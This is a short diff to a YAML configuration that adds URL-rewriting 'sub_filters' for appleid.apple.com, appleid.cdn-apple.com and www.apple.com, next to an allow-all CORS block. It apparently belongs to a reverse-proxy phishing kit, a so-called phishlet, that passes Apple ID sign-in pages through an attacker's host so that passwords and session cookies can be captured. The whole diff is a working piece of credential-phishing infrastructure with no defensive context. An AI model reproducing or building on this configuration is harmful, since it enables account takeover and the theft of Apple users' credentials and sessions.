@@ -50,3 +50,10 @@ cors:
   mode: "allow_all"
   methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
   headers: ["*"]
+sub_filters:
+  - {triggers_on: "appleid.apple.com", orig_sub: "appleid", domain: "apple.com", search: "https://appleid.apple.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "appleid.apple.com", orig_sub: "appleid", domain: "apple.com", search: "https:\\/\\/appleid.apple.com\\/", replace: "https:\\/\\/{hostname}\\/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "appleid.cdn-apple.com", orig_sub: "cdn", domain: "cdn-apple.com", search: "https://appleid.cdn-apple.com/", replace: "https://{hostname}/_cdn/", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "appleid.cdn-apple.com", orig_sub: "cdn", domain: "cdn-apple.com", search: "https:\\/\\/appleid.cdn-apple.com\\/", replace: "https:\\/\\/{hostname}\\/_cdn\\/", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "www.apple.com", orig_sub: "www", domain: "apple.com", search: "https://www.apple.com/", replace: "https://{hostname}/_www/", mimes: ["text/html", "application/javascript"]}
+  - {triggers_on: "www.apple.com", orig_sub: "www", domain: "apple.com", search: "https:\\/\\/www.apple.com\\/", replace: "https:\\/\\/{hostname}\\/_www\\/", mimes: ["text/html", "application/javascript"]}
